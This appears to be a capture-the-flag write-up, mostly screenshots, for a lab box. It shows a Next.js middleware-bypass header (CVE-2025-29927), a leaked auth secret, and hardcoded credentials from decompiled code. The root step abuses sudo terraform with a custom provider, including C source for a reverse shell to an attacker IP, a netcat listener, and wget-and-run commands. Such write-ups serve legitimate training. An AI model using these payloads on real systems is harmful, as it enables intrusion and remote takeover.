![[IMG-20250825192312409.png]]
## Foothold

### [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)

![[IMG-20250825192312472.png]]

![[IMG-20250825192312635.png]]
USE:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

![[IMG-20250825192312724.png]]

![[IMG-20250825192312815.png]]

![[IMG-20250825192312925.png]]

![[IMG-20250825192313002.png]]



![[IMG-20250825192313077.png]]

![[IMG-20250825192313147.png]]

```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

![[IMG-20250825192313265.png]]

```
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
```

![[IMG-20250825192313327.png]]

```js
let o = {
        session: { strategy: "jwt" },
        providers: [
          r.n(CredentialsProvider)()({
            name: "Credentials",
            credentials: {
              username: { label: "User", type: "username" },
              password: { label: "Password", type: "password" }
            },
            authorize: async e =>
              e?.username === "jeremy" &&
              e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
                ? { id: "1", name: "Jeremy" }
                : null
          })
        ],
        pages: { signIn: "/signin" },
        secret: process.env.NEXTAUTH_SECRET
      };
```

## User Flag

```
user: jeremy
password: MyNameIsJeremyAndILovePancakes
```

![[IMG-20250825192313380.png]]

## Root Flag

### Analyse

![[IMG-20250825192313517.png]]

![[IMG-20250825192313635.png]]

### Exploit

[Doc Terraform](https://developer.hashicorp.com/terraform/cli/config/environment-variables)

![[IMG-20250825192313713.png]]

Load a config file custom.

![[IMG-20250825192313763.png]]

### Attacker machine

```bash
gcc main.c -o terraform-provider-examples
python3 -m http.server 8000
nc -lvnp 4444
```

main.c:
```c
#include <unistd.h>
int main() {
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.141/4444 0>&1", NULL);
    return 0;
}

```

### Victim machine

```bash
wget http://10.10.14.141:8000/terraform-provider-examples
chmod +x terraform-provider-examples
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

![[IMG-20250825192313844.png]]

![[IMG-20250825192313920.png]]




